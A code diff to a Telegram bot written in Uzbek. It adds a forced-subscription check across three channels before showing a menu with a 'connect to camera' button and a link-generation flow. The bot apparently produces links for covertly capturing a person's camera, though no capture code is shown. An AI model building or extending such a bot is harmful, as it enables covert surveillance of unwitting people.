@@ -221,12 +221,91 @@ bot.onText(/\/cleanuri (.+)/, async (msg, match) => {
 });
 
 
-
-// Kanal IDingizni kiriting
-const channelId = '@CREZZA';
+const channelIds = ['@CREZZA', '@RAYO_PUBG', '@OAZIS_PUBG']; // Kanallar ro'yxati
 
 // /start komandasini qayta ishlash
 bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    try {
+        const notSubscribedChannels = []; // Obuna bo'lmagan kanallar ro'yxati
+
+        // Barcha kanallar uchun obuna bo'lganlikni tekshirish
+        for (const channelId of channelIds) {
+            const chatMember = await bot.getChatMember(channelId, userId);
+
+            if (
+                chatMember.status !== 'member' &&
+                chatMember.status !== 'administrator' &&
+                chatMember.status !== 'creator'
+            ) {
+                notSubscribedChannels.push(channelId);
+            }
+        }
+
+        if (notSubscribedChannels.length === 0) {
+            // Foydalanuvchi barcha kanallarga a'zo bo'lgan
+            // Botning asosiy xizmatlarini ko'rsatish kodi
+            // ...
+          const buttons = {
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: '📚 Bot haqida', url: 'https://telegra.ph/camuzbot-Ishga-tushurish-05-03' },
+                    { text: '👨🏻‍💻 Adminstrator', url: 'tg://user?id=1165036983' }
+                  ],
+                  [
+                    { text: '📸 Kameraga ulanish', callback_data: 'crenew' }
+                  ]
+                ]
+              }
+            };
+
+            const caption = `Assalomu aleykum <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a></b> 🍃\n\n<blockquote>📚 Botdan foydalanishdan avval botdan foydalanish qoidalari va shartlari bilan batafsil tanishib chiqing!</blockquote>`;
+
+            const imageStream = "https://telegra.ph/file/f321c19ce6bf22ccaac6f.jpg";
+            bot.sendPhoto(msg.chat.id, imageStream, { caption, parse_mode: 'HTML', reply_markup: buttons.reply_markup });
+          } else {
+            // Foydalanuvchi ayrim kanallarga a'zo bo'lmagan
+            const options = {
+                reply_markup: {
+                    inline_keyboard: [
+                        ...notSubscribedChannels.map((channelId) => [
+                            {
+                                text: `➕ ${channelId.slice(1)} kanaliga obuna bo'lish`,
+                                url: `https://t.me/${channelId.slice(1)}`,
+                            },
+                        ]),
+                        [{ text: 'Tasdiqlash ✅', url: 'https://t.me/pouzbot?start=bot' }],
+                    ],
+                },
+            };
+            await bot.sendMessage(
+                chatId,
+                `⚠️ Botdan foydalanish uchun quyidagi kanallarga obuna bo'lishingiz kerak:\n\n${notSubscribedChannels
+                    .map((channelId) => `- ${channelId}`)
+                    .join('\n')}`,
+                options
+            );
+        }
+    } catch (error) {
+        console.error(error);
+        bot.sendMessage(chatId, 'Kechirasiz, biror narsa xato ketdi.');
+    }
+});
+
+
+
+
+// Kanal IDingizni kiriting
+
+
+
+const channelId = '@CREZZA';
+
+// /start komandasini qayta ishlash
+bot.onText(/\/stark/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
@@ -530,7 +609,7 @@ bot.sendMessage(cid, `✅ Sizning havolangiz muvaffaqqiyatli tayyorlandi:
 else{
 bot.sendMessage(cid,`Hato link yubordingiz 🥺\n\nIltimos qayta urinib koring 😊\n\nMisol uchun : https://google.com yoki http://google.com`);
 createNew(cid);
-j
+
 }  
 }
 
